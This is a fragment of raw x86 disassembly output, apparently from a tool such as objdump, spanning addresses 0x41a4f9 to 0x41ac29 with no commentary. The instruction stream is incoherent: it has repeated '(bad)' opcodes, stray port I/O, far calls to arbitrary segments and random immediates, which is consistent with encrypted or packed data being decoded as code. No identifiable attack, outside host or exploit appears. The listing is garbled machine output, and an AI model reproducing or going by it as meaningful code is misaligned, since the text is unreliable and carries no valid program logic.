  41a4f9:	and    dl,BYTE PTR [esi-0x3c]
  41a4fc:	data16 mov dh,0xb8
  41a4ff:	ss loopne 0x41a493
  41a502:	cmp    ebp,0xe88f3f71
  41a508:	shr    BYTE PTR [ebx+edx*8-0x6a9c2e04],cl
  41a50f:	push   edi
  41a510:	fdivr  st,st(5)
  41a512:	pop    eax
  41a513:	sub    BYTE PTR [ecx],ah
  41a515:	cwde   
  41a516:	push   0x14f546a4
  41a51b:	lahf   
  41a51c:	std    
  41a51d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a51e:	mov    al,0x8a
  41a520:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a521:	int3   
  41a522:	repnz adc ch,bh
  41a525:	rcl    BYTE PTR [edi],1
  41a527:	mov    cl,0x24
  41a529:	jo     0x41a55d
  41a52b:	push   0xffa8cd36
  41a530:	(bad)  [esi]
  41a532:	out    dx,al
  41a533:	jecxz  0x41a4e7
  41a535:	cmp    al,0x34
  41a537:	cld    
  41a538:	in     eax,0x93
  41a53a:	xchg   BYTE PTR [ebp-0x1],bl
  41a53d:	mov    BYTE PTR [esi+0x79fedc36],ah
  41a543:	stc    
  41a544:	test   eax,0xf1cdb45c
  41a549:	scas   eax,DWORD PTR es:[edi]
  41a54a:	das    
  41a54b:	pop    ebp
  41a54c:	test   BYTE PTR [ecx+0xaefdbcd],dl
  41a552:	push   edi
  41a553:	mov    edi,0x6de63fad
  41a558:	dec    edx
  41a559:	ret    
  41a55a:	adc    esi,DWORD PTR [edi]
  41a55c:	adc    BYTE PTR [ecx-0x632bb2cb],0xf3
  41a563:	leave  
  41a564:	outs   dx,DWORD PTR ds:[esi]
  41a565:	and    al,BYTE PTR [eax]
  41a567:	lds    ebp,FWORD PTR [eax-0x4f]
  41a56a:	fsub   DWORD PTR ds:0x3a87dcea
  41a570:	bnd je 0x41a5bf
  41a573:	dec    edi
  41a574:	call   0x2347:0xf573759
  41a57b:	add    eax,0xb8d60481
  41a580:	mov    bl,0x4
  41a582:	scas   al,BYTE PTR es:[edi]
  41a583:	in     al,dx
  41a584:	retf   
  41a585:	add    al,0x2e
  41a587:	scas   eax,DWORD PTR es:[edi]
  41a588:	and    eax,0xd669034b
  41a58d:	mov    bh,0x71
  41a58f:	out    0xa0,al
  41a591:	scas   al,BYTE PTR es:[edi]
  41a592:	in     al,0x5d
  41a594:	inc    esi
  41a595:	pop    ecx
  41a596:	mov    eax,0x5e75b3dc
  41a59b:	mov    edx,0x5d3b2a9f
  41a5a0:	xor    al,0x98
  41a5a2:	cmp    eax,0xd7d9b549
  41a5a7:	fld    st(2)
  41a5a9:	jmp    DWORD PTR [edx+eiz*4]
  41a5ac:	mov    dl,0xf
  41a5ae:	sbb    BYTE PTR [ebp+ebx*8+0x3c],0xc9
  41a5b3:	stos   DWORD PTR es:[edi],eax
  41a5b4:	jp     0x41a557
  41a5b6:	ja     0x41a53e
  41a5b8:	loope  0x41a5df
  41a5ba:	mov    ebp,0xd3036f5
  41a5bf:	or     DWORD PTR [edx+edx*1-0x3b],edi
  41a5c3:	add    cl,BYTE PTR [eax]
  41a5c5:	jbe    0x41a59c
  41a5c7:	sub    al,0x1
  41a5c9:	clc    
  41a5ca:	in     al,0x1b
  41a5cc:	(bad)  
  41a5cd:	fstp   st(7)
  41a5cf:	inc    ebp
  41a5d0:	dec    eax
  41a5d1:	lahf   
  41a5d2:	scas   al,BYTE PTR es:[edi]
  41a5d3:	ret    
  41a5d4:	shl    BYTE PTR [eax+0xa68bc6a],0x1f
  41a5db:	inc    ebp
  41a5dc:	sub    eax,0x844de2ad
  41a5e1:	int3   
  41a5e2:	sbb    ah,BYTE PTR [ecx+eiz*8-0x7a5eed8]
  41a5e9:	cmp    esi,edx
  41a5eb:	mov    eax,ds:0xa3ce7107
  41a5f0:	enter  0x4d5e,0xb7
  41a5f4:	inc    esp
  41a5f5:	adc    ecx,DWORD PTR [esi+0x324c51a3]
  41a5fb:	jge    0x41a585
  41a5fd:	fadd   st,st(5)
  41a5ff:	xchg   DWORD PTR [edi-0x3cb9007a],esi
  41a605:	shl    DWORD PTR [edx-0x3f],cl
  41a608:	lahf   
  41a609:	and    DWORD PTR [esp+eiz*2],ebx
  41a60c:	jbe    0x41a61b
  41a60e:	retf   
  41a60f:	lea    esi,ds:0x6313e281
  41a615:	and    eax,0x27379c80
  41a61a:	shl    BYTE PTR [edi+0x6e002df],0xa7
  41a621:	mov    al,ds:0x287b5afa
  41a626:	cmp    DWORD PTR [esi-0x6c00ad4c],eax
  41a62c:	add    edx,edx
  41a62e:	push   esi
  41a62f:	out    dx,al
  41a630:	(bad)  
  41a631:	aaa    
  41a632:	outs   dx,DWORD PTR ds:[esi]
  41a633:	dec    ecx
  41a634:	lds    eax,FWORD PTR [edx+0x6c]
  41a637:	jno    0x41a5f4
  41a639:	mov    dh,ah
  41a63b:	sub    BYTE PTR ss:[ebp-0x27],ah
  41a63f:	and    eax,0xae6d5ca
  41a644:	std    
  41a645:	mov    fs,esp
  41a647:	repz out dx,eax
  41a649:	or     eax,0x4d41ffd4
  41a64e:	cdq    
  41a64f:	or     al,0xbd
  41a651:	iret   
  41a652:	xor    dl,ch
  41a654:	mov    ds:0xc3b09a24,al
  41a659:	loope  0x41a6cd
  41a65b:	test   BYTE PTR [ecx+0x60],0xb4
  41a65f:	test   eax,0x63e79163
  41a664:	je     0x41a6df
  41a666:	aas    
  41a667:	stos   DWORD PTR es:[edi],eax
  41a668:	sbb    BYTE PTR [eax],bl
  41a66a:	mov    esp,0x6ef0b1f6
  41a66f:	xchg   esp,eax
  41a670:	into   
  41a671:	addr16 ja 0x41a659
  41a674:	aad    0x7f
  41a676:	ret    
  41a677:	repz dec edi
  41a679:	in     al,dx
  41a67a:	int3   
  41a67b:	or     DWORD PTR [edx-0x4f],esi
  41a67e:	pop    ds
  41a67f:	call   0x8850:0x90631f62
  41a686:	jno    0x41a694
  41a688:	pushf  
  41a689:	inc    edi
  41a68a:	xchg   edx,eax
  41a68b:	adc    DWORD PTR [edi+0x32],esi
  41a68e:	cwde   
  41a68f:	sti    
  41a690:	in     eax,dx
  41a691:	mov    dh,0x73
  41a693:	popf   
  41a694:	loopne 0x41a63c
  41a696:	out    0x49,al
  41a698:	push   ebx
  41a699:	xor    cl,BYTE PTR fs:[eax]
  41a69c:	xchg   ebp,eax
  41a69d:	inc    ebp
  41a69e:	neg    DWORD PTR [edx+0x6e]
  41a6a1:	cmp    bh,BYTE PTR [esi+0x3e]
  41a6a4:	fild   DWORD PTR [ebx]
  41a6a6:	push   esp
  41a6a7:	lds    ecx,FWORD PTR [eax]
  41a6a9:	mov    al,0x84
  41a6ab:	push   es
  41a6ac:	and    DWORD PTR [ebx-0x2b],ebx
  41a6af:	jns    0x41a69f
  41a6b1:	mov    ah,BYTE PTR [esi+0x3f]
  41a6b4:	ds ss ins DWORD PTR es:[edi],dx
  41a6b7:	xchg   edx,eax
  41a6b8:	xor    eax,ebx
  41a6ba:	xor    eax,0x8a997242
  41a6bf:	cmp    eax,0x85473b47
  41a6c4:	xchg   edi,eax
  41a6c5:	aaa    
  41a6c6:	cmp    ebx,DWORD PTR [eax]
  41a6c8:	mov    ds:0x47a46f47,al
  41a6cd:	push   es
  41a6ce:	and    BYTE PTR [ebp-0x1c],ah
  41a6d1:	lds    ecx,FWORD PTR [edx-0x6c]
  41a6d4:	loopne 0x41a6f6
  41a6d6:	push   ds
  41a6d7:	mov    ecx,0xb5201afa
  41a6dc:	fimul  WORD PTR [esp+esi*2-0xca05baa]
  41a6e3:	sbb    esp,DWORD PTR [ebp+edi*4-0x2de49e3c]
  41a6ea:	mov    al,ds:0xf4d70097
  41a6ef:	cmp    dh,0xf6
  41a6f2:	ins    BYTE PTR es:[edi],dx
  41a6f3:	fcmovbe st,st(1)
  41a6f5:	inc    ebp
  41a6f6:	ss push ss
  41a6f8:	or     BYTE PTR [edi+0x526f47b1],dh
  41a6fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a6ff:	pop    edx
  41a700:	jg     0x41a6c9
  41a702:	addr16 mov edx,0xcfe70c46
  41a708:	test   al,0xee
  41a70a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a70b:	and    eax,0x56cd4277
  41a710:	icebp  
  41a711:	scas   al,BYTE PTR es:[edi]
  41a712:	es dec ebx
  41a714:	pop    ds
  41a715:	dec    edi
  41a716:	sahf   
  41a717:	push   esi
  41a718:	xor    bl,BYTE PTR [ecx+0x14]
  41a71b:	pop    eax
  41a71c:	stos   BYTE PTR es:[edi],al
  41a71d:	lds    esp,FWORD PTR [eax+0x5c]
  41a720:	retf   
  41a721:	sub    BYTE PTR [ebx+0x6f],cl
  41a724:	mov    edi,0x88e625ad
  41a729:	out    dx,eax
  41a72a:	jecxz  0x41a6ca
  41a72c:	adc    al,0xbb
  41a72e:	push   ss
  41a72f:	sahf   
  41a730:	out    0xd6,al
  41a732:	push   edx
  41a733:	push   ds
  41a734:	iret   
  41a735:	retf   
  41a736:	bound  eax,QWORD PTR [edx-0x2c]
  41a739:	cmp    eax,0x3f2cacb9
  41a73e:	jmp    0x41a7a2
  41a740:	lea    ebx,[eax+0x1b5fc8ef]
  41a746:	ret    
  41a747:	inc    eax
  41a748:	cli    
  41a749:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a74a:	iret   
  41a74b:	xchg   ecx,eax
  41a74c:	in     eax,dx
  41a74d:	lock je 0x41a6db
  41a750:	mov    eax,0x5db96e7b
  41a755:	mov    eax,0x1607d196
  41a75a:	(bad)  
  41a75b:	cmc    
  41a75c:	iret   
  41a75d:	and    eax,0x3eabc192
  41a762:	mov    ds:0xc5423cea,eax
  41a767:	push   ecx
  41a768:	hlt    
  41a769:	and    edi,DWORD PTR [ebp-0x50aa0d0f]
  41a76f:	sbb    esi,DWORD PTR [ecx+0x4b57460d]
  41a775:	inc    ebp
  41a776:	shr    ebp,cl
  41a778:	dec    edx
  41a779:	aaa    
  41a77a:	sbb    bh,BYTE PTR [esi-0x524c36a0]
  41a780:	jae    0x41a7c1
  41a782:	test   eax,0x8ce4ebfc
  41a787:	lods   eax,DWORD PTR ds:[esi]
  41a788:	and    DWORD PTR ds:0xe942d425,ebx
  41a78e:	push   ebp
  41a78f:	jbe    0x41a74a
  41a791:	lods   eax,DWORD PTR ds:[esi]
  41a792:	dec    ebx
  41a793:	sbb    eax,0xbd45d494
  41a798:	lahf   
  41a799:	aad    0xd9
  41a79b:	jns    0x41a7bf
  41a79d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a79e:	mov    cl,0x35
  41a7a0:	jmp    ebp
  41a7a2:	scas   al,BYTE PTR es:[edi]
  41a7a3:	xchg   esp,eax
  41a7a4:	sbb    al,0x79
  41a7a6:	or     eax,0xf4c07920
  41a7ab:	mov    eax,0xbcfbd365
  41a7b0:	lea    eax,[bx+si]
  41a7b3:	mov    edi,0x615e34f3
  41a7b8:	sbb    BYTE PTR [esi+0x6ded9243],cl
  41a7be:	addr16 mov edi,0x84b03fcb
  41a7c4:	cli    
  41a7c5:	sbb    al,0xb2
  41a7c7:	or     eax,0x70b982fd
  41a7cc:	fsub   st(4),st
  41a7ce:	pop    ss
  41a7cf:	jno    0x41a77d
  41a7d1:	jbe    0x41a82c
  41a7d3:	mov    bh,0xc
  41a7d5:	jae    0x41a777
  41a7d7:	sbb    BYTE PTR [ebx+0x626c74c0],ah
  41a7dd:	ins    BYTE PTR es:[edi],dx
  41a7de:	adc    DWORD PTR [ecx+edi*4-0x30],ebp
  41a7e2:	push   DWORD PTR [ebx]
  41a7e4:	xchg   DWORD PTR [ecx+0x28],ecx
  41a7e7:	jp     0x41a80a
  41a7e9:	ins    DWORD PTR es:[edi],dx
  41a7ea:	xor    al,dh
  41a7ec:	sbb    ebp,DWORD PTR [ebx]
  41a7ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a7ef:	dec    edi
  41a7f0:	push   edx
  41a7f1:	imul   ecx,eax,0x83864112
  41a7f7:	sbb    BYTE PTR [esi],al
  41a7f9:	or     eax,0x4b9baf2b
  41a7fe:	mov    eax,0xec5fd5bc
  41a803:	jo     0x41a7f5
  41a805:	push   edx
  41a806:	adc    al,0xa2
  41a808:	push   edi
  41a809:	push   esp
  41a80a:	pop    ebp
  41a80b:	mov    DWORD PTR [eax-0x7e],eax
  41a80e:	mov    BYTE PTR [esp+edi*2-0x3a],0x68
  41a813:	xchg   ecx,eax
  41a814:	adc    BYTE PTR [ebx],cl
  41a816:	lea    edi,[edx+0x3d875c86]
  41a81c:	inc    ecx
  41a81d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a81e:	inc    ecx
  41a81f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a820:	mov    bl,0xe6
  41a822:	mov    ebx,0xcf95fcb8
  41a827:	inc    ebx
  41a828:	or     DWORD PTR [eax],eax
  41a82a:	popf   
  41a82b:	fsub   DWORD PTR [edx+0xdcab9d9]
  41a831:	cwde   
  41a832:	xchg   edx,eax
  41a833:	xchg   DWORD PTR [ebx+0x79d9fe9d],edx
  41a839:	pusha  
  41a83a:	clc    
  41a83b:	daa    
  41a83c:	fdivr  DWORD PTR [edx+0x56]
  41a83f:	outs   dx,DWORD PTR ds:[esi]
  41a840:	cli    
  41a841:	push   cs
  41a842:	push   edx
  41a843:	xchg   esp,eax
  41a844:	sar    BYTE PTR [ebp+eiz*1+0x24],0x4c
  41a849:	inc    esp
  41a84a:	(bad)  
  41a84c:	push   edi
  41a84d:	test   bh,cl
  41a84f:	sbb    eax,DWORD PTR [edi]
  41a851:	sbb    eax,0x99ba3f29
  41a856:	sbb    al,0xc0
  41a858:	inc    edi
  41a859:	or     al,0xe1
  41a85b:	xchg   ecx,eax
  41a85c:	cmc    
  41a85d:	jne    0x41a835
  41a85f:	add    DWORD PTR [edi],edi
  41a861:	push   cs
  41a862:	retf   
  41a863:	cli    
  41a864:	popf   
  41a865:	loop   0x41a7f3
  41a867:	inc    esp
  41a868:	add    eax,0xf427f697
  41a86d:	outs   dx,BYTE PTR ds:[esi]
  41a86e:	in     al,0xbd
  41a870:	sbb    eax,0x7dbb8a5d
  41a875:	inc    esp
  41a876:	pop    eax
  41a877:	and    BYTE PTR [ebx+0x3441fc1a],bh
  41a87d:	xchg   ecx,eax
  41a87e:	xor    al,0x85
  41a880:	add    BYTE PTR [ecx-0x4fead06c],bl
  41a886:	adc    bh,ah
  41a888:	mov    dh,0x51
  41a88a:	mov    ebx,DWORD PTR [ebx+0x43]
  41a88d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a88e:	jmp    0x8aca22c6
  41a893:	leave  
  41a894:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a895:	inc    eax
  41a896:	jbe    0x41a888
  41a898:	(bad)  
  41a899:	pop    esp
  41a89a:	enter  0x4580,0x41
  41a89e:	add    eax,0xe1f091dc
  41a8a3:	xlat   BYTE PTR ds:[ebx]
  41a8a4:	cmc    
  41a8a5:	ficomp WORD PTR [eax-0x5]
  41a8a8:	cli    
  41a8a9:	or     BYTE PTR [eax-0x63944d9],dl
  41a8af:	add    eax,0x3a5b13f9
  41a8b4:	fst    QWORD PTR [eax]
  41a8b6:	mov    bl,0xbc
  41a8b8:	or     eax,0x24f1e41d
  41a8bd:	push   ss
  41a8be:	push   ecx
  41a8bf:	mov    eax,0x254f5f65
  41a8c4:	call   0x44c2:0x6c5341e8
  41a8cb:	mov    esi,0xcd2d8f50
  41a8d0:	jge    0x41a8fe
  41a8d2:	lahf   
  41a8d3:	cmp    ch,BYTE PTR [eax+edi*4+0x25]
  41a8d7:	inc    ecx
  41a8d8:	adc    esp,ebp
  41a8da:	test   dh,dl
  41a8dc:	pop    es
  41a8dd:	xchg   edi,eax
  41a8de:	popf   
  41a8df:	xor    esi,ecx
  41a8e1:	test   BYTE PTR [edi],0x37
  41a8e4:	cmp    DWORD PTR [ebx+0x1417d9ce],ebp
  41a8ea:	sahf   
  41a8eb:	cmp    dl,dl
  41a8ed:	loop   0x41a8da
  41a8ef:	jns    0x41a96e
  41a8f1:	sar    DWORD PTR [ecx+0x1f93895b],0x9d
  41a8f8:	loopne 0x41a8d3
  41a8fa:	shl    DWORD PTR [esi-0x75],cl
  41a8fd:	sub    cl,BYTE PTR [esi]
  41a8ff:	mov    esi,0xcb7eb494
  41a904:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a905:	sbb    esp,ecx
  41a907:	mov    bl,0x7d
  41a909:	and    eax,0x818712e5
  41a90e:	xchg   DWORD PTR [esi],edi
  41a910:	out    dx,al
  41a911:	stos   DWORD PTR es:[edi],eax
  41a912:	jnp    0x41a93f
  41a914:	cmp    BYTE PTR [edi-0x59c5715a],0x14
  41a91b:	push   0x6896fe05
  41a920:	rcl    BYTE PTR [eax+0x14],cl
  41a923:	(bad)  
  41a924:	sbb    BYTE PTR [eax+0x5314d56f],bh
  41a92a:	js     0x41a8e4
  41a92c:	dec    edx
  41a92d:	ror    DWORD PTR [edx+esi*8-0xb],cl
  41a931:	xor    al,0x4
  41a933:	and    dl,BYTE PTR fs:[ebx+0x35]
  41a937:	push   cs
  41a938:	or     BYTE PTR [ecx],0x85
  41a93b:	repnz mov edi,0x2674e6b6
  41a941:	fs call 0xbfcb:0x215d5ead
  41a949:	mov    BYTE PTR [ebx-0x4a0c90c7],ch
  41a94f:	nop
  41a950:	jne    0x41a938
  41a952:	cmp    DWORD PTR [ebp+0x22],ebx
  41a955:	mov    ebp,ebp
  41a957:	push   0x68d7b2b8
  41a95c:	cmp    ebp,DWORD PTR [esi+0x4f]
  41a95f:	jo     0x41a9b7
  41a961:	jo     0x41a969
  41a963:	fist   DWORD PTR [ecx-0x4d95d349]
  41a969:	fadd   DWORD PTR [esi+0xe]
  41a96c:	jae    0x41a8fb
  41a96e:	cmp    BYTE PTR [esi-0x10],bl
  41a971:	js     0x41a97d
  41a973:	jmp    0x41a901
  41a975:	ds mov cl,0x1e
  41a978:	sub    dh,BYTE PTR [ecx-0x5e]
  41a97b:	icebp  
  41a97c:	test   DWORD PTR [esi+0x4359472c],0x742e4f29
  41a986:	hlt    
  41a987:	daa    
  41a988:	xor    cl,BYTE PTR [edi+0x69]
  41a98b:	pop    ebp
  41a98c:	sbb    eax,0x8ac4f90e
  41a991:	out    dx,al
  41a992:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a993:	push   es
  41a994:	push   esp
  41a995:	cs aam 0x7f
  41a998:	pop    eax
  41a999:	xchg   ecx,eax
  41a99a:	aad    0x4f
  41a99c:	aaa    
  41a99d:	in     al,0x53
  41a99f:	push   ebp
  41a9a0:	stc    
  41a9a1:	or     BYTE PTR [edx],0x9f
  41a9a4:	clc    
  41a9a5:	and    dh,BYTE PTR [edi+0x61]
  41a9a8:	ror    DWORD PTR [eax+eax*4-0x1a],0x83
  41a9ad:	dec    esp
  41a9ae:	(bad)  
  41a9af:	push   edi
  41a9b0:	xor    esi,ebp
  41a9b2:	inc    eax
  41a9b3:	dec    edx
  41a9b4:	jmp    0x41a9b1
  41a9b6:	push   esi
  41a9b7:	jge    0x41a979
  41a9b9:	cmp    cl,BYTE PTR [edi-0x43]
  41a9bc:	ins    DWORD PTR es:[edi],dx
  41a9bd:	mov    bh,ah
  41a9bf:	nop
  41a9c0:	pushf  
  41a9c1:	mov    ebx,0xa28c972c
  41a9c6:	jp     0x41a9a3
  41a9c8:	adc    al,bh
  41a9ca:	push   cs
  41a9cb:	add    al,0xf9
  41a9cd:	in     al,dx
  41a9ce:	fadd   QWORD PTR [ecx]
  41a9d0:	inc    ecx
  41a9d1:	(bad)  
  41a9d2:	push   ss
  41a9d3:	ret    
  41a9d4:	cwde   
  41a9d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a9d6:	ds push esi
  41a9d8:	mov    bl,0x2d
  41a9da:	js     0x41a9cb
  41a9dc:	dec    ebx
  41a9dd:	sbb    BYTE PTR [ebx+0x569a52d6],0xa9
  41a9e4:	ins    BYTE PTR es:[edi],dx
  41a9e5:	add    cl,BYTE PTR [esi-0x9d3f0d4]
  41a9eb:	or     BYTE PTR [ebp-0xa],ah
  41a9ee:	test   BYTE PTR ds:0xc6131a58,0xd2
  41a9f5:	and    BYTE PTR [eax-0x3b],ch
  41a9f8:	dec    esp
  41a9f9:	jae    0x41a9fb
  41a9fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9fc:	ret    0x21b2
  41a9ff:	jnp    0x41a9a4
  41aa01:	and    eax,0x38fc07b1
  41aa06:	cld    
  41aa07:	ds sbb edi,ebx
  41aa0a:	inc    BYTE PTR [eax+0x6a455bbd]
  41aa10:	fcomp  DWORD PTR [ecx+0x27]
  41aa13:	rol    DWORD PTR [esi],0xd0
  41aa16:	jge    0x41a99b
  41aa18:	mov    al,ds:0x40863832
  41aa1d:	stos   DWORD PTR es:[edi],eax
  41aa1e:	stos   BYTE PTR es:[edi],al
  41aa1f:	(bad)
  41aa22:	mov    ah,BYTE PTR [ebx-0x2ecc4acc]
  41aa28:	int    0x31
  41aa2a:	mov    al,0x54
  41aa2c:	mov    al,0xab
  41aa2e:	shl    BYTE PTR ds:0x62a03a4a,1
  41aa34:	je     0x41aa24
  41aa36:	stc    
  41aa37:	fmul   QWORD PTR [ecx]
  41aa39:	add    DWORD PTR [ecx+0x4e600751],edi
  41aa3f:	cmp    ebp,DWORD PTR [ebx+0x5a]
  41aa42:	(bad)  
  41aa43:	js     0x41a9eb
  41aa45:	push   cs
  41aa46:	ins    BYTE PTR es:[edi],dx
  41aa47:	jle    0x41aa2a
  41aa49:	in     al,dx
  41aa4a:	xchg   edx,eax
  41aa4b:	pop    ebp
  41aa4c:	adc    BYTE PTR [ebx],cl
  41aa4e:	ret    0xb1ed
  41aa51:	(bad)  
  41aa52:	stc    
  41aa53:	(bad)  
  41aa54:	cmp    DWORD PTR [ebx+0x8007fc],edi
  41aa5a:	and    ah,BYTE PTR [esi-0x72]
  41aa5d:	pusha  
  41aa5e:	push   ds
  41aa5f:	push   ds
  41aa60:	mov    ch,0xdf
  41aa62:	dec    edi
  41aa63:	daa    
  41aa64:	repnz xlat BYTE PTR ds:[ebx]
  41aa66:	dec    esi
  41aa67:	adc    ecx,0xffffffe0
  41aa6a:	adc    BYTE PTR [ebx+ebx*2+0x1a07e6a4],ah
  41aa71:	lods   al,BYTE PTR ds:[esi]
  41aa72:	mov    ah,0x3b
  41aa74:	adc    eax,0x3e279f5f
  41aa79:	ins    DWORD PTR es:[edi],dx
  41aa7a:	lock add bh,BYTE PTR [edi+ecx*8-0x1a]
  41aa7f:	not    BYTE PTR [ebx+0x487e7722]
  41aa85:	icebp  
  41aa86:	jmp    0x41aa4f
  41aa88:	jno    0x41aabd
  41aa8a:	mov    ecx,DWORD PTR [ebx+0x20]
  41aa8d:	imul   edi,DWORD PTR ds:0x4e0ba510,0x2aa20e2d
  41aa97:	xchg   edi,eax
  41aa98:	inc    ebx
  41aa99:	mov    edi,0xfb990116
  41aa9e:	cdq    
  41aa9f:	sti    
  41aaa0:	add    dl,dh
  41aaa2:	xchg   esp,eax
  41aaa3:	inc    esp
  41aaa4:	xrelease xchg DWORD PTR [edx],edx
  41aaa7:	mov    ebp,0x90b4f537
  41aaac:	cdq    
  41aaad:	mov    ss,WORD PTR [edi+0x6b41878]
  41aab3:	retf   
  41aab4:	cli    
  41aab5:	sar    BYTE PTR [edi-0x1],1
  41aab8:	sahf   
  41aab9:	push   eax
  41aaba:	add    WORD PTR ds:0xce32d9c2,bx
  41aac1:	out    dx,al
  41aac2:	scas   eax,DWORD PTR es:[edi]
  41aac3:	jb     0x41aad0
  41aac5:	aam    0x43
  41aac7:	in     al,dx
  41aac8:	adc    BYTE PTR [ecx],al
  41aaca:	out    dx,al
  41aacb:	outs   dx,DWORD PTR ds:[esi]
  41aacc:	jge    0x41aa77
  41aace:	out    0x70,al
  41aad0:	push   es
  41aad1:	mov    bh,0x49
  41aad3:	mov    ds:0xe59dd189,al
  41aad8:	ins    DWORD PTR es:[edi],dx
  41aad9:	and    al,0x8b
  41aadb:	stc    
  41aadc:	rol    BYTE PTR ds:[ebx-0x72fd3284],1
  41aae3:	ja     0x41ab0a
  41aae5:	idiv   BYTE PTR [ecx]
  41aae7:	hlt    
  41aae8:	dec    edx
  41aae9:	add    al,dl
  41aaeb:	sbb    eax,DWORD PTR [ebx]
  41aaed:	or     BYTE PTR [ebp+0x8f6009e],al
  41aaf3:	xchg   esi,eax
  41aaf4:	pushf  
  41aaf5:	ud2    
  41aaf7:	daa    
  41aaf8:	adc    al,0xd0
  41aafa:	shr    DWORD PTR [esi+0x2fffe3fa],cl
  41ab00:	js     0x41ab17
  41ab02:	xchg   edi,eax
  41ab03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab04:	rol    dl,0x89
  41ab07:	aaa    
  41ab08:	sub    dh,BYTE PTR [eax-0xb]
  41ab0b:	xlat   BYTE PTR ds:[ebx]
  41ab0c:	jmp    0x328d49c0
  41ab11:	enter  0xbc43,0x32
  41ab15:	and    eax,0x52320d0a
  41ab1a:	xchg   BYTE PTR [ebp-0x11],dl
  41ab1d:	out    0x40,al
  41ab1f:	or     eax,0x2aa9d16c
  41ab24:	jle    0x41aaaa
  41ab26:	mov    ch,0xb3
  41ab28:	mov    ecx,0x13a6b82e
  41ab2d:	push   0x54
  41ab2f:	mov    dh,0xd8
  41ab31:	repz sub bh,al
  41ab34:	ins    DWORD PTR es:[edi],dx
  41ab35:	shl    edi,0xb3
  41ab38:	pusha  
  41ab39:	mov    ebp,0x377e6ef7
  41ab3e:	mov    ds:0xa1b8aa71,al
  41ab43:	sbb    BYTE PTR [eax+ebx*4-0x3845c616],0x37
  41ab4b:	sub    edx,DWORD PTR [esi+eiz*4+0x1cb7e2fb]
  41ab52:	sbb    BYTE PTR ds:0x6e15f400,ch
  41ab58:	mov    dh,0x29
  41ab5a:	xchg   edx,eax
  41ab5b:	and    eax,0xc4229324
  41ab60:	add    bh,BYTE PTR [edx]
  41ab62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab63:	dec    esp
  41ab64:	pusha  
  41ab65:	sahf   
  41ab66:	push   ds
  41ab67:	lea    ebp,[esi+0x30]
  41ab6a:	bound  ebx,QWORD PTR [ebx-0x6ab7d247]
  41ab70:	adc    edi,ebx
  41ab72:	mov    ss,WORD PTR [esi+0x20]
  41ab75:	out    dx,al
  41ab76:	xor    eax,esp
  41ab78:	int    0x13
  41ab7a:	shl    DWORD PTR [esp+ecx*4],cl
  41ab7d:	jle    0x41abfe
  41ab7f:	pop    ds
  41ab80:	lahf   
  41ab81:	adc    ecx,DWORD PTR [ecx+edi*8-0x5d]
  41ab85:	out    0x11,al
  41ab87:	cmp    al,0x3a
  41ab89:	mov    esp,0xaf0a50f9
  41ab8e:	mov    al,cl
  41ab90:	pushf  
  41ab91:	cmp    BYTE PTR [ebx+edx*4-0x24],dl
  41ab95:	mov    bl,0x74
  41ab97:	xchg   ecx,eax
  41ab98:	aaa    
  41ab99:	ror    DWORD PTR [ebx],cl
  41ab9b:	or     edx,DWORD PTR ds:0xc9a70241
  41aba1:	xchg   ecx,eax
  41aba2:	jae    0x41abed
  41aba4:	daa    
  41aba5:	and    DWORD PTR [edi],ebp
  41aba7:	gs mov bl,al
  41abaa:	xchg   ecx,eax
  41abab:	repnz push 0xd27e71ab
  41abb1:	jno    0x41ac24
  41abb3:	fsincos 
  41abb5:	sbb    ah,BYTE PTR [edi]
  41abb7:	std    
  41abb8:	lods   al,BYTE PTR ds:[esi]
  41abb9:	lds    edx,FWORD PTR [edi]
  41abbb:	adc    esp,DWORD PTR [edi+0x3e50033e]
  41abc1:	add    ebx,DWORD PTR [ebp+0x15a02f28]
  41abc7:	pop    edi
  41abc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41abc9:	pop    esp
  41abca:	mov    edx,0x77e636b5
  41abcf:	pushf  
  41abd0:	out    0xe5,al
  41abd2:	outs   dx,DWORD PTR ds:[esi]
  41abd3:	adc    ebx,DWORD PTR [ebx-0xe63ee17]
  41abd9:	sahf   
  41abda:	(bad)  
  41abdd:	je     0x41ab9f
  41abdf:	dec    esi
  41abe0:	aad    0xaf
  41abe2:	pusha  
  41abe3:	cmp    al,0xf9
  41abe5:	scas   eax,DWORD PTR es:[edi]
  41abe6:	jo     0x41ab7d
  41abe8:	cmp    eax,DWORD PTR [esi+ebx*1+0x3b5ba7d6]
  41abef:	inc    esi
  41abf0:	daa    
  41abf1:	or     al,0x38
  41abf3:	test   esp,eax
  41abf5:	in     al,dx
  41abf6:	fs aad 0x5f
  41abf9:	test   ebp,0xf9940694
  41abff:	xchg   ebp,eax
  41ac00:	ins    DWORD PTR es:[edi],dx
  41ac01:	dec    edi
  41ac02:	xchg   ch,al
  41ac04:	mov    eax,0x184ad183
  41ac09:	repnz aaa 
  41ac0b:	push   edx
  41ac0c:	sub    esi,ecx
  41ac0e:	mov    esp,DWORD PTR [esi-0x6a]
  41ac11:	xor    ebp,0x54
  41ac14:	xchg   esi,eax
  41ac15:	ins    BYTE PTR es:[edi],dx
  41ac16:	or     dl,BYTE PTR [eax+0x18]
  41ac19:	push   ebx
  41ac1a:	add    eax,DWORD PTR [edi-0x29cca85d]
  41ac20:	add    BYTE PTR [edx-0x258cd035],al
  41ac26:	sahf   
  41ac27:	leave  
  41ac28:	in     eax,dx
  41ac29:	scas   al,BYTE PTR es:[edi]
